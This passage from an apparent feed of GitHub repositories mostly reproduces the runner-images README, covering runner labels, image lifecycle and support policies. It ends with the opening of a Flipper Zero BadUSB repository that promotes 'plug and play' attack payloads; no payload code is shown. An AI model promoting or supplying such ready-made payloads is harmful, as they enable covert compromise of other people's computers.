&lt;p&gt;This repository contains the source code used to create the VM images for &lt;a href=&quot;https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners&quot;&gt;GitHub-hosted runners&lt;/a&gt; used for Actions, as well as for &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/devops/pipelines/agents/hosted?view=azure-devops#use-a-microsoft-hosted-agent&quot;&gt;Microsoft-hosted agents&lt;/a&gt; used for Azure Pipelines. To build a VM machine from this repo&#39;s source, see the &lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/docs/create-image-and-azure-resources.md&quot;&gt;instructions&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Available Images&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Image&lt;/th&gt; 
   &lt;th&gt;YAML Label&lt;/th&gt; 
   &lt;th&gt;Included Software&lt;/th&gt; 
   &lt;th&gt;Rollout Status of Latest Image Release&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Ubuntu 24.04&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ubuntu-latest&lt;/code&gt; or &lt;code&gt;ubuntu-24.04&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/ubuntu/Ubuntu2404-Readme.md&quot;&gt;ubuntu-24.04&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fsubir0071%2F385e39188f4280878bada99250e99db7%2Fraw%2Fubuntu24.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Ubuntu 22.04&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;ubuntu-22.04&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/ubuntu/Ubuntu2204-Readme.md&quot;&gt;ubuntu-22.04&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fsubir0071%2F385e39188f4280878bada99250e99db7%2Fraw%2Fubuntu22.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;macOS 15&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;macos-15-large&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-15-Readme.md&quot;&gt;macOS-15&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fsubir0071%2F385e39188f4280878bada99250e99db7%2Fraw%2Fmacos-15.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;macOS 15 Arm64&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;macos-15&lt;/code&gt; or &lt;code&gt;macos-15-xlarge&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-15-arm64-Readme.md&quot;&gt;macOS-15-arm64&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fsubir0071%2F385e39188f4280878bada99250e99db7%2Fraw%2Fmacos-15-arm64.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;macOS 14&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;macos-latest-large&lt;/code&gt; or &lt;code&gt;macos-14-large&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-14-Readme.md&quot;&gt;macOS-14&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fsubir0071%2F385e39188f4280878bada99250e99db7%2Fraw%2Fmacos-14.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;macOS 14 Arm64&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;macos-latest&lt;/code&gt;, &lt;code&gt;macos-14&lt;/code&gt;, &lt;code&gt;macos-latest-xlarge&lt;/code&gt; or &lt;code&gt;macos-14-xlarge&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-14-arm64-Readme.md&quot;&gt;macOS-14-arm64&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fsubir0071%2F385e39188f4280878bada99250e99db7%2Fraw%2Fmacos-14-arm64.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;macOS 13&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;macos-13&lt;/code&gt; or &lt;code&gt;macos-13-large&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-13-Readme.md&quot;&gt;macOS-13&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fsubir0071%2F385e39188f4280878bada99250e99db7%2Fraw%2Fmacos-13.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;macOS 13 Arm64&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;macos-13-xlarge&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/macos/macos-13-arm64-Readme.md&quot;&gt;macOS-13-arm64&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fsubir0071%2F385e39188f4280878bada99250e99db7%2Fraw%2Fmacos-13-arm64.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Windows Server 2025&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;windows-2025&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/windows/Windows2025-Readme.md&quot;&gt;windows-2025&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fsubir0071%2F385e39188f4280878bada99250e99db7%2Fraw%2Fwin25.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Windows Server 2022&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;windows-latest&lt;/code&gt; or &lt;code&gt;windows-2022&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/windows/Windows2022-Readme.md&quot;&gt;windows-2022&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src=&quot;https://img.shields.io/endpoint?url=https%3A%2F%2Fgist.githubusercontent.com%2Fsubir0071%2F385e39188f4280878bada99250e99db7%2Fraw%2Fwin22.json&quot; alt=&quot;Endpoint Badge&quot; /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Windows Server 2019&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;windows-2019&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href=&quot;https://github.com/actions/runner-images/raw/main/images/windows/Windows2019-Readme.md&quot;&gt;windows-2019&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;img src=&quot;https://img.shields.io/badge/-Deprecated-red&quot; alt=&quot;Deprecated&quot; /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Label scheme&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;In general the &lt;code&gt;-latest&lt;/code&gt; label is used for the latest OS image version that is GA&lt;/li&gt; 
 &lt;li&gt;Before moving the&lt;code&gt;-latest&lt;/code&gt; label to a new OS version we will announce the change and give sufficient lead time for users to update their workflows&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Announcements&lt;/h2&gt; 
&lt;p&gt;See notable upcoming changes by viewing issues with the &lt;a href=&quot;https://github.com/actions/runner-images/labels/Announcement&quot;&gt;Announcement&lt;/a&gt; label.&lt;/p&gt; 
&lt;h2&gt;Image Definitions&lt;/h2&gt; 
&lt;h3&gt;Beta&lt;/h3&gt; 
&lt;p&gt;The purpose of a Beta is to collect feedback on an image before it is released to GA. The goal of a Beta is to identify and fix any potential issues that exist on that image. Images are updated on a weekly cadence. Any workflows that run on a beta image do not fall under the customer &lt;a href=&quot;https://github.com/customer-terms/github-online-services-sla&quot;&gt;SLA&lt;/a&gt; in place for Actions. Customers choosing to use Beta images are encouraged to provide feedback in the runner-images repo by creating an issue. A Beta may take on different availability, i.e. public vs private.&lt;/p&gt; 
&lt;h3&gt;GA&lt;/h3&gt; 
&lt;p&gt;A GA (General Availability) image has been through a Beta period and is deemed ready for general use. Images are updated on a weekly cadence. In order to be moved to GA the image must meet the following criteria:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Has been through a Beta period (public or private)&lt;/li&gt; 
 &lt;li&gt;Most major software we install on the image has a compatible version for the underlying OS and&lt;/li&gt; 
 &lt;li&gt;All major bugs reported during the Beta period have been addressed.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;This image type falls under the customer &lt;a href=&quot;https://github.com/customer-terms/github-online-services-sla&quot;&gt;SLA&lt;/a&gt; for actions. GA images are eventually deprecated according to our guidelines as we only support the latest 2 versions of an OS.&lt;/p&gt; 
&lt;h4&gt;Latest Migration Process&lt;/h4&gt; 
&lt;p&gt;GitHub Actions and Azure DevOps use the &lt;code&gt;-latest&lt;/code&gt; YAML label (ex: &lt;code&gt;ubuntu-latest&lt;/code&gt;, &lt;code&gt;windows-latest&lt;/code&gt;, and &lt;code&gt;macos-latest&lt;/code&gt;). These labels point towards the newest stable OS version available.&lt;/p&gt; 
&lt;p&gt;The &lt;code&gt;-latest&lt;/code&gt; migration process is gradual and happens over 1-2 months in order to allow customers to adapt their workflows to the newest OS version. During this process, any workflow using the &lt;code&gt;-latest&lt;/code&gt; label, may see changes in the OS version in their workflows or pipelines. To avoid unwanted migration, users can specify a specific OS version in the yaml file (ex: macos-14, windows-2022, ubuntu-22.04).&lt;/p&gt; 
&lt;h2&gt;Image Releases&lt;/h2&gt; 
&lt;p&gt;&lt;em&gt;How to best follow along with changes&lt;/em&gt;&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;Find the latest releases for this repository &lt;a href=&quot;https://github.com/actions/runner-images/releases&quot;&gt;here.&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Subscribe to the releases coming out of this repository, instructions &lt;a href=&quot;https://docs.github.com/en/account-and-profile/managing-subscriptions-and-notifications-on-github/setting-up-notifications/configuring-notifications#configuring-your-watch-settings-for-an-individual-repository&quot;&gt;here.&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Upcoming changes: A pre-release is created when the deployment of an image has started. As soon as the deployment is finished, the pre-release is converted to a release. If you have subscribed to releases, you will get notified of pre-releases as well.&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;You can also track upcoming changes using the &lt;a href=&quot;https://github.com/actions/runner-images/labels/awaiting-deployment&quot;&gt;awaiting-deployment&lt;/a&gt; label.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;For high impact changes, we will post these in advance to the GitHub Changelog on our &lt;a href=&quot;https://github.blog/changelog/&quot;&gt;blog&lt;/a&gt; and on &lt;a href=&quot;https://twitter.com/GHchangelog&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Ex: breaking changes, GA or deprecation of images&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;em&gt;Cadence&lt;/em&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;We typically deploy weekly updates to the software on the runner images.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Software and Image Support&lt;/h2&gt; 
&lt;h3&gt;Support Policy&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Tools and versions will typically be removed 6 months after they are deprecated or have reached end-of-life&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;We support (at maximum) 2 GA images and 1 beta image at a time. We begin the deprecation process of the oldest image label once the newest OS image label has been released to GA.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;The images generally contain the latest versions of packages installed except for Ubuntu LTS where we mostly rely on the Canonical-provided repositories.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Popular tools can have several versions installed side-by-side with the following strategy:&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Tool name&lt;/th&gt; 
   &lt;th&gt;Installation strategy&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Docker images&lt;/td&gt; 
   &lt;td&gt;not more than 3 latest LTS OS\tool versions. New images or new versions of current images are added using the standard tool request process&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Java&lt;/td&gt; 
   &lt;td&gt;all LTS versions&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Node.js&lt;/td&gt; 
   &lt;td&gt;3 latest LTS versions&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Go&lt;/td&gt; 
   &lt;td&gt;3 latest minor versions&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Python &lt;br /&gt; Ruby&lt;/td&gt; 
   &lt;td&gt;5 most popular &lt;code&gt;major.minor&lt;/code&gt; versions&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;PyPy&lt;/td&gt; 
   &lt;td&gt;3 most popular &lt;code&gt;major.minor&lt;/code&gt; versions&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;.NET Core&lt;/td&gt; 
   &lt;td&gt;2 latest LTS versions and 1 latest version. For each feature version only latest patch is installed. Note for &lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/docs/dotnet-ubuntu.md&quot;&gt;Ubuntu images see details.&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;GCC &lt;br /&gt; GNU Fortran &lt;br /&gt; Clang &lt;br /&gt; GNU C++&lt;/td&gt; 
   &lt;td&gt;3 latest major versions&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Android NDK&lt;/td&gt; 
   &lt;td&gt;1 latest non-LTS, 2 latest LTS versions&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Xcode&lt;/td&gt; 
   &lt;td&gt;- only one major version of Xcode will be supported per macOS version &lt;br /&gt; - all minor versions of the supported major version will be available &lt;br /&gt; - beta and RC versions will be provided &quot;as-is&quot; in the latest available macOS image only no matter of beta/GA status of the image &lt;br /&gt; - when a new patch version is released, the previous patch version will be replaced&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Xcode Platforms&lt;/td&gt; 
   &lt;td&gt;- only three major.minor versions of platform tools and simulator runtimes will be available for installed Xcode, including beta/RC versions&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Package managers usage&lt;/h3&gt; 
&lt;p&gt;We use third-party package managers to install software during the image generation process. The table below lists the package managers and the software installed.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!NOTE] Third-party repositories are re-evaluated every year to identify if they are still useful and secure.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align=&quot;left&quot;&gt;Operating system&lt;/th&gt; 
   &lt;th align=&quot;center&quot;&gt;Package manager&lt;/th&gt; 
   &lt;th align=&quot;right&quot;&gt;Third-party repos and packages&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;Ubuntu&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://wiki.debian.org/Apt&quot;&gt;APT&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;right&quot;&gt;&lt;a href=&quot;https://download.docker.com/linux/ubuntu&quot;&gt;docker&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://packages.adoptium.net/artifactory/deb/&quot;&gt;Eclipse-Temurin (Adoptium)&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://packages.erlang-solutions.com/ubuntu&quot;&gt;Erlang&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://ppa.launchpad.net/mozillateam/ppa/ubuntu&quot;&gt;Firefox&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://packagecloud.io/install/repositories/github/git-lfs&quot;&gt;git-lfs&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://launchpad.net/~git-core/+archive/ubuntu/ppa&quot;&gt;git&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://packages.cloud.google.com/apt&quot;&gt;Google Cloud CLI&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://cli-assets.heroku.com/channels/stable/apt&quot;&gt;Heroku&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://dl.hhvm.com/ubuntu&quot;&gt;HHvm&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://repo.mongodb.org/apt/ubuntu&quot;&gt;MongoDB&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://download.mono-project.com/repo/ubuntu&quot;&gt;Mono&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://packages.microsoft.com/repos/edge&quot;&gt;MS Edge&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://apt.postgresql.org/pub/repos/apt/&quot;&gt;PostgreSQL&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://cloud.r-project.org/bin/linux/ubuntu&quot;&gt;R&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://pypa.github.io/pipx&quot;&gt;pipx&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;right&quot;&gt;ansible-core &lt;br /&gt;yamllint&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;Windows&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://chocolatey.org&quot;&gt;Chocolatey&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;right&quot;&gt;No third-party repos installed&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;macOS&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://brew.sh&quot;&gt;Homebrew&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;right&quot;&gt;&lt;a href=&quot;https://github.com/aws/homebrew-tap&quot;&gt;aws-cli v2&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://github.com/Azure/homebrew-bicep&quot;&gt;azure/bicep&lt;/a&gt; &lt;br /&gt; &lt;a href=&quot;https://github.com/mongodb/homebrew-brew&quot;&gt;mongodb/brew&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align=&quot;left&quot;&gt;&lt;/td&gt; 
   &lt;td align=&quot;center&quot;&gt;&lt;a href=&quot;https://pypa.github.io/pipx/&quot;&gt;pipx&lt;/a&gt;&lt;/td&gt; 
   &lt;td align=&quot;right&quot;&gt;yamllint&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h3&gt;Image Deprecation Policy&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Images begin the deprecation process of the oldest image label once a new GA OS version has been released.&lt;/li&gt; 
 &lt;li&gt;Deprecation process begins with an announcement that sets a date for deprecation&lt;/li&gt; 
 &lt;li&gt;As it gets closer to the date, GitHub begins doing scheduled brownouts of the image&lt;/li&gt; 
 &lt;li&gt;During this time there will be an Announcement pinned in the repo to remind users of the deprecation.&lt;/li&gt; 
 &lt;li&gt;Finally GitHub will deprecate the image and it will no longer be available&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Preinstallation Policy&lt;/h3&gt; 
&lt;p&gt;In general, these are the guidelines we follow when deciding what to pre-install on our images:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Popularity: widely-used tools and ecosystems will be given priority.&lt;/li&gt; 
 &lt;li&gt;Latest Technology: recent versions of tools will be given priority.&lt;/li&gt; 
 &lt;li&gt;Deprecation: end-of-life tools and versions will not be added.&lt;/li&gt; 
 &lt;li&gt;Licensing: MIT, Apache, or GNU licenses are allowed.&lt;/li&gt; 
 &lt;li&gt;Time &amp;amp; Space on the Image: we will evaluate how much time is saved and how much space is used by having the tool pre-installed.&lt;/li&gt; 
 &lt;li&gt;Support: If a tool requires the support of more than one version, we will consider the cost of this maintenance.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Default Version Update Policy&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;In general, once a new version is installed on the image, we announce the default version update 2 weeks prior to deploying it.&lt;/li&gt; 
 &lt;li&gt;For potentially dangerous updates, we may extend the timeline up to 1 month between the announcement and deployment.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;How to Interact with the Repo&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Issues&lt;/strong&gt;: To file a bug report, or request tools to be added/updated, please&amp;nbsp;&lt;a href=&quot;https://github.com/actions/runner-images/issues/new/choose&quot;&gt;open an issue using the appropriate template&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Discussions&lt;/strong&gt;: If you want to share your thoughts about image configuration, installed software, or bring a new idea, please create a new topic in a&amp;nbsp;&lt;a href=&quot;https://github.com/actions/runner-images/discussions&quot;&gt;discussion&lt;/a&gt;&amp;nbsp;for a corresponding category. Before making a new discussion please make sure no similar topics were created earlier.&lt;/li&gt; 
 &lt;li&gt;For general questions about using the runner images or writing your Actions workflow, please open requests in the &lt;a href=&quot;https://github.community/c/github-actions/41&quot;&gt;GitHub Actions Community Forum&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;FAQs&lt;/h2&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;b&gt;&lt;i&gt;What images are available for GitHub Actions and Azure DevOps?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; 
 &lt;p&gt;The availability of images for GitHub Actions and Azure DevOps is the same. However, deprecation policies may differ. See documentation for more details:&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;a href=&quot;https://docs.github.com/en/free-pro-team@latest/actions/reference/specifications-for-github-hosted-runners#supported-runners-and-hardware-resources&quot;&gt;GitHub Actions&lt;/a&gt;&lt;/li&gt; 
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/devops/pipelines/agents/hosted?view=azure-devops&amp;amp;tabs=yaml#software&quot;&gt;Azure DevOps&lt;/a&gt;&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;b&gt;&lt;i&gt;What image version is used in my build?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; 
 &lt;p&gt;Usually, image deployment takes 2-3 days, and documentation in the &lt;code&gt;main&lt;/code&gt; branch is only updated when deployment is finished. To find out which image version and what software versions are used in a specific build, see &lt;code&gt;Set up job&lt;/code&gt; (GitHub Actions) or &lt;code&gt;Initialize job&lt;/code&gt; (Azure DevOps) step log. &lt;img width=&quot;1440&quot; alt=&quot;actions-runner-image&quot; src=&quot;https://github.com/actions/runner-images/assets/88318005/922a8bf5-3e4d-4265-9527-b3b51e6bf9c8&quot; /&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;b&gt;&lt;i&gt;Looking for other Linux distributions?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; 
 &lt;p&gt;We do not plan to offer other Linux distributions. We recommend using Docker if you&#39;d like to build using other distributions with the hosted runner images. Alternatively, you can leverage &lt;a href=&quot;https://help.github.com/en/actions/hosting-your-own-runners&quot;&gt;self-hosted runners&lt;/a&gt; and fully customize your VM image to your needs.&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;b&gt;&lt;i&gt;How do I contribute to the macOS source?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; 
 &lt;p&gt;macOS source lives in this repository and is available for everyone. However, macOS image-generation CI doesn&#39;t support external contributions yet so we are not able to accept pull-requests for now.&lt;/p&gt; 
 &lt;p&gt;We are in the process of preparing macOS CI to accept contributions. Until then, we appreciate your patience and ask you to continue to make tool requests by filing issues.&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;b&gt;&lt;i&gt;How does GitHub determine what tools are installed on the images?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; 
 &lt;p&gt;For some tools, we always install the latest at the time of the deployment; for others, we pin the tool to specific version(s). For more details please see the &lt;a href=&quot;https://raw.githubusercontent.com/actions/runner-images/main/#preinstallation-policy&quot;&gt;Preinstallation Policy&lt;/a&gt;&lt;/p&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;b&gt;&lt;i&gt;How do I request that a new tool be pre-installed on the image?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; Please create an issue and get an approval from us to add this tool to the image before creating the pull request. 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;b&gt;&lt;i&gt;What branch should I use to build custom image?&lt;/i&gt;&lt;/b&gt;&lt;/summary&gt; We strongly encourage customers to build their own images using the main branch. This repository contains multiple branches and releases that serve as document milestones to reflect what software is installed in the images at certain point of time. Current builds are not idempotent and if one tries to build a runner image using the specific tag it is not guaranteed that the build will succeed. 
&lt;/details&gt;</description>
    </item>
    
    <item>
      <title>I-Am-Jakoby/Flipper-Zero-BadUSB</title>
      <link>https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB</link>
      <description>&lt;p&gt;Repository for my flipper zero badUSB payloads. Now almost entirely plug and play.&lt;/p&gt;&lt;hr&gt;&lt;div align=&quot;center&quot;&gt; 
 &lt;h1&gt;💀 BadUSB 💀&lt;/h1&gt; 
 &lt;p align=&quot;center&quot;&gt; &lt;a href=&quot;https://github.com/sponsors/I-Am-Jakoby&quot;&gt; &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/Discord-Sponsor.png&quot; width=&quot;125&quot; alt=&quot;Python&quot; /&gt; &lt;/a&gt; &lt;/p&gt; 
 &lt;p&gt;Subscribing to my YouTube would also be greatly appreciated.&lt;/p&gt; 
 &lt;p&gt;&lt;a href=&quot;https://jakoby.lol/yno&quot;&gt;&lt;img src=&quot;https://custom-icon-badges.herokuapp.com/badge/-Subscribe-red?style=for-the-badge&amp;amp;logo=video&amp;amp;logoColor=white&quot; /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;img src=&quot;https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/disclaimer.png&quot; width=&quot;600&quot; alt=&quot;C#&quot; /&gt; 
&lt;/div&gt; 
&lt;h1&gt;Table of Contents&lt;/h1&gt; 
